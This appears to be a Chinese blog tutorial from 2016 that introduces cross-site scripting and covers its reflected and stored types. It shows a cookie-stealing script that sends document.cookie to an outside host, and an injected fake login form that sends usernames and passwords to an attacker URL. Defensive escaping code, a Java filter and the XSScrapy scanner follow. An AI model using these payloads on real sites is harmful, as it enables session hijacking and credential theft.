title: WEB安全初探之XSS
tags:
  - XSS
categories:
  - 信息安全
date: 2016-03-09 15:48:00
---

XSS 全称(Cross Site Scripting) 跨站脚本攻击，是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。比如获取用户的Cookie，导航到恶意网站,携带木马等。

## 0x01 XSS攻击的分类
根据XSS脚本注入方式的不同，我们可以对XSS攻击进行简单的分类。其中，最常见的就数反射型XSS和存储型XSS了。

### 1. 反射型XSS
反射型XSS，又称非持久型XSS。之所以称为反射型XSS，则是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的。而称为非持久型XSS，则是因为这种攻击方式具有一次性。
攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。

### 2. 存储型XSS
存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。


## 0x02 XSS攻击的手段及其危害

### 1. 窃取Cookie
具体实现方法：
先构造语句`<script>window.open('http://dlgyi.rrvv.net/cookie.asp?msg='+document.cookie)</script>`
这句话意思是打开一个新的窗口，访问http://dlgyi.rrvv.net/cookie.asp这个网址，并且通过msg传递一个变量，这里的变量就是我们要收集的cookie了。

### 2. 引导钓鱼
``` html
<script>
function hack()
{
                   location.replace(“http://www.attackpage.com/record.asp?username=“
+document.forms[0].user.value + “password=” + document.forms[0].pass.value);
}
</script>
<form>
<br><br><HR><H3>这个功能需要登录:</H3 >
<br><br>请输入用户名：<br>
<input type=”text” id=”user”name=”user”>
<br>请输入密码：<br>
<input type=”password” name =“pass”>
<br><input type=”submit”name=”login” value=”登录”onclick=”hack()”>
</form><br><br><HR>
```
注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。


## 0x03 XSS的预防

### 1. 前端过滤XSS
``` javascript
function xssCheck(str,reg){
    return str ? str.replace(reg || /[&<">'](?:(amp|lt|quot|gt|#39|nbsp|#\d+);)?/g, function (a, b) {
        if(b){
            return a;
        }else{
            return {
                '<':'&lt;',
                '&':'&amp;',
                '"':'&quot;',
                '>':'&gt;',
                "'":'&#39;',
            }[a]
        }
    }) : '';
}
```

### 2. 后端预防

#### spring提供的方法
``` xml
<context-param>
   <param-name>defaultHtmlEscape</param-name>
   <param-value>true</param-value>
</context-param>

Forms加上：<spring:htmlEscape defaultHtmlEscape="true" />
```

#### 手动escape
首先添加一个jar包：commons-lang-2.5.jar ，然后在后台调用这些函数：StringEscapeUtils.escapeHtml(string); StringEscapeUtils.escapeJavaScript(string); StringEscapeUtils.escapeSql(string);

#### 后台加Filter
``` java
private String cleanXSS(String value) {
    //You'll need to remove the spaces from the html entities below
    value = value.replaceAll("<", "& lt;").replaceAll(">", "& gt;");
    value = value.replaceAll("\\(", "& #40;").replaceAll("\\)", "& #41;");
    value = value.replaceAll("'", "& #39;");
    value = value.replaceAll("eval\\((.*)\\)", "");
    value = value.replaceAll("[\\\"\\\'][\\s]*javascript:(.*)[\\\"\\\']", "\"\"");
    value = value.replaceAll("script", "");
    return value;
}
```


## 0x04 一款XSS漏洞检测爬虫 - XSScrapy
``` bash
./xsscrapy.py -u http://example.com
./xsscrapy.py -u http://example.com/login_page -l loginname
```


## 0x05 XSS练习
http://vulnweb.janusec.com/index-xss.php


## 0x06 推荐站点
- [WooYun知识库](http://drops.wooyun.org/)
- [FreeBuf黑客与极客](http://www.freebuf.com/)
- [SecWiki](http://www.sec-wiki.com/index.php)


## 0x07 参考文档
- [XSS的原理分析与解剖](http://www.freebuf.com/articles/web/40520.html)
- [XSS的原理分析与解剖（第二篇）](http://www.freebuf.com/articles/web/42727.html)
- [前端防御XSS](http://drops.wooyun.org/web/13009)
- [Spring MVC防御CSRF、XSS和SQL注入攻击](http://www.cnblogs.com/Mainz/archive/2012/11/01/2749874.html)
- [快速、直接的XSS漏洞检测爬虫 – XSScrapy](http://itindex.net/detail/51089-xss-xsscrapy)
- [xsscrapy](https://github.com/DanMcInerney/xsscrapy)